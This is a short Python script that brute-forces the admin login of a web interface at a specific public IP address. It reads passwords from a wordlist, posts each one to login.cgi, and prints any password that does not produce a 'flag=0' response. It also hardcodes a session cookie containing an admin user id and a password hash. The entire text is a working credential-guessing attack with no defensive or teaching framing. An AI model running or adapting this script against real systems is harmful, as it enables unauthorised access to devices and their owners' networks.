#http://180.158.42.222:800/login.html

import requests
requests.packages.urllib3.disable_warnings()
url = "http://180.158.42.222:800/login.html"
api = "http://180.158.42.222:800/login.cgi"

headers = {
    "Content-Length":"53",
    "Cache-Control":"max-age=0",
    "Upgrade-Insecure-Requests":"1",
    "Origin":"http://180.158.42.222:800",
    "Content-Type":"application/x-www-form-urlencoded",
    "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36Edg/128.0.0.0",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer":"http://180.158.42.222:800/login.html",
    "Accept-Encoding":"gzip,deflate,br",
    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie":"ac_userid=admin,ac_passwd=7DA0D5B8FBF4DA4729D6EEFBDE590973",
}
result = requests.get(url=url,timeout=5)
#print(request.status_code)

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}
with open ("password.txt","r",encoding="utf-8")as f:
    for i in f.readlines():
        password = i.strip()
        data = f"user=admin&password={password}&Submit=%E7%99%BB+%E5%BD%95"
        if result.status_code == 200:
            result1 = requests.post(url=api,data=data,headers=headers,timeout=5)
            if 'flag=0' in result1.text:
                pass
            else:
                print(f"登录的密码 是 {password}")




